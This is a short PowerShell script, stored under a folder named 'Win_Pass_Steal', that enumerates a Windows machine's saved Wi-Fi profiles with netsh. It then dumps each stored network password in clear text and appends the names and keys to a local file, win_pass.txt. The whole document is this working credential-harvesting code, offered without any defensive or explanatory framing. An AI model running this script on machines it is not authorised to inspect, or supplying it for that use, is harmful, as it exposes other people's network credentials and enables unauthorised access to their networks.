Set-Location D:\Executable\Windows\Powershell\Win_Pass_Steal
$text=netsh wlan show profiles

$patt=$text | Select-String -Pattern 'All User Profile' -CaseSensitive -SimpleMatch

$len=$patt.Length


$split=$patt -split(":")

for (($i = 1);$i -lt $len*2; $i++){
    if ($i%2 -ne 0){
        $replace=$split[$i]
        $space=$replace.replace(' ' , '""')
        $text2=netsh wlan show profiles $space key=clear
        $patt2=$text2 | Select-String -Pattern 'Key Content' -CaseSensitive -SimpleMatch
        $out_file=$replace,$patt2
        $out_file>>win_pass.txt
    }
    
}
